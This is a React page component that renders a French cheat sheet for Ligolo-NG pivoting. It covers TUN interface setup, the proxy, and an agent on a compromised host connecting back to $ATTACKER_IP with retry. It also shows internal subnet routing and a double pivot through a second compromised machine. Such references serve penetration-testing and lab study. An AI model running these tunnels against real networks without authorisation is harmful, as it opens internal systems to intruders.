"use client";

export default function LigoloPage() {
  type CommandItem = {
    cmd: string;
    why: string;
  };

  type CommandSection = {
    title: string;
    groupId?: string;
    commands: CommandItem[];
  };

  const sections: CommandSection[] = [
    {
      title: "Setup - Interface",
      groupId: "setup",
      commands: [
        {
          cmd: "sudo ip tuntap add user root mode tun ligolo\nsudo ip link set ligolo up",
          why: "Crée et active l'interface TUN ligolo sur l'attaquant. À faire une seule fois par session.",
        },
        {
          cmd: "sudo ip link delete ligolo",
          why: "Supprime l'interface en fin de mission (nettoyage).",
        },
      ],
    },
    {
      title: "Proxy - Attaquant",
      groupId: "proxy",
      commands: [
        {
          cmd: "./proxy -selfcert",
          why: "Lance le proxy sur 0.0.0.0:11601 avec un certificat autosigné (adapté au lab).",
        },
      ],
    },
    {
      title: "Agent - Cible",
      groupId: "agent",
      commands: [
        {
          cmd: "./agent --connect $ATTACKER_IP:11601 --ignore-cert --retry",
          why: "Connecte l'agent depuis la machine compromise vers le proxy. --retry maintient la connexion.",
        },
      ],
    },
    {
      title: "Session - Gestion",
      groupId: "session",
      commands: [
        {
          cmd: "ligolo-ng » session",
          why: "Liste les sessions actives en attente de sélection.",
        },
        {
          cmd: "ligolo-ng » 1",
          why: "Sélectionne la session numéro 1.",
        },
        {
          cmd: "ligolo-ng » ifconfig",
          why: "Affiche les interfaces réseau de la machine compromise, utile pour cartographier les subnets internes.",
        },
        {
          cmd: "ligolo-ng » start",
          why: "Lance le tunnel sur l'interface ligolo. Le trafic routé vers ligolo passe par la cible.",
        },
      ],
    },
    {
      title: "Routing - Subnets",
      groupId: "routing",
      commands: [
        {
          cmd: "sudo ip route add $SUBNET dev ligolo",
          why: "Route un subnet interne via l'interface ligolo pour l'atteindre depuis l'attaquant.",
        },
        {
          cmd: "ip route list",
          why: "Vérifie les routes actives pour confirmer que le subnet est bien accessible.",
        },
        {
          cmd: "sudo ip route del $SUBNET dev ligolo",
          why: "Retire une route quand elle n'est plus nécessaire.",
        },
      ],
    },
    {
      title: "Double Pivot",
      groupId: "doublepivot",
      commands: [
        {
          cmd: "sudo ip tuntap add user root mode tun ligolo2\nsudo ip link set ligolo2 up",
          why: "Crée une seconde interface TUN pour pivoter depuis une deuxième machine compromise.",
        },
        {
          cmd: "ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp",
          why: "Ouvre un listener sur l'agent (machine 1) qui redirige vers le proxy. Permet à l'agent 2 de s'y connecter.",
        },
        {
          cmd: "ligolo-ng » tunnel_start --tun ligolo2",
          why: "Lance le tunnel sur l'interface ligolo2 pour la session du second agent.",
        },
        {
          cmd: "sudo ip route add $SUBNET2 dev ligolo2",
          why: "Route le subnet du troisième segment via ligolo2.",
        },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">
          Pivoting
        </p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">
          Ligolo-NG
        </h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          Tunnel TUN kernel-space, routing de subnets internes et double pivot.
        </p>
      </header>

      <section className="space-y-4">
        {sections.map((section) => (
          <article key={section.title} id={section.groupId} className="rounded-sm border border-border p-5">
            <h2 className="font-mono text-xs uppercase tracking-widest text-primary">{section.title}</h2>
            <div className="mt-3 space-y-4">
              {section.commands.map((item) => (
                <article key={item.cmd} className="rounded-sm border border-border/60 p-3">
                  <pre className="overflow-x-auto rounded-sm bg-muted/30 p-3 text-xs text-foreground">
                    <code>{item.cmd}</code>
                  </pre>
                  <p className="mt-2 text-xs text-muted-foreground">{item.why}</p>
                </article>
              ))}
            </div>
          </article>
        ))}
      </section>
    </div>
  );
}
